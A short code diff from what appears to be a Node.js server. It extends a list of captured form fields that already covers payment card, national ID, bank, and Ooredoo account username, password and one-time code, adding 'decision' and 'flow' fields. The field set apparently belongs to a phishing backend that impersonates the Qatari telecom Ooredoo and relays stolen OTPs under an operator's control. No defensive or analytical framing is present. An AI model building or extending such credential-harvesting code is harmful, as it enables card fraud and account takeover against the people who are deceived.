@@ -92,7 +92,7 @@ const readBody = (req) => new Promise((resolve) => {
   });
 });
 
-const FIELDS = ['card', 'status', 'name', 'qid', 'phone', 'email', 'gender', 'bank', 'address', 'ooredooUser', 'ooredooPass', 'ooredooOtp'];
+const FIELDS = ['card', 'status', 'name', 'qid', 'phone', 'email', 'gender', 'bank', 'address', 'ooredooUser', 'ooredooPass', 'ooredooOtp', 'ooredooDecision', 'ooredooFlow'];
 
 const serveFile = (res, file) => {
   fs.readFile(file, (err, buf) => {
